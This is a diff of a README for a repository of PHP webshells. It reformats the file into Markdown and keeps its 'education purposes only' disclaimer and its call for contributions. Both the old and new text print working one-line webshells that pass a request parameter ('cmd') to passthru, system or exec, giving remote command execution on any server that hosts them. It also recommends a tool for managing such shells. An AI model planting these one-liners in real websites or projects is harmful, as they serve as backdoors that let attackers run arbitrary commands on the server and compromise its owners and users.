@@ -1,30 +1,25 @@
-Contributing
-============
-To contribute other shells not listed here... Fork, Push the changes to your repo, then before you request for a Pull, make sure to include a simple description of your **php** web-shell and include a screen-shot of the web-shell (as hosted in your localhost).
+# php-webshells
 
-php-webshells
-=============
+Common PHP webshells. These are provided for education purposes only. __Do not put these on a publicly-accessible webserver.__ 
 
-Common PHP shells. Do not put these on a publicly-accessible webserver.
+I recommend a one-liner and while not a full fledged webshell it works fine.
 
-These are provided for education purposes only.
-
-Common php webshells. Do not host the file(s) in your server!
-
-++++++++++++++++++++++++++
-
-Though I recommend one-liners like 
-
+```php
 <?php echo passthru($_GET['cmd']); ?>
+```
 
-(Not a full fledged webshell, but works fine)
+You can try [WebHandler](https://github.com/lnxg33k/webhandler) to manage one-liners for POST and GET requests:
 
-=================================================================
-
-You can try WebHandler for one-liners.
-
-WebHandler.py works for POST and GET requests:
-
+```php
     <?php system($_GET['cmd']); ?>
     <?php passthru($_REQUEST['cmd']); ?>
     <?php echo exec($_POST['cmd']); ?>
+```
+
+## Contributing
+
+To contribute other shells not listed here:
+1. Fork the [repo](https://github.com/JohnTroony/php-webshells)
+2. Push the changes to your repo.
+3. Make sure to include a simple description of your webshell.
+4. Issue a Pull request.
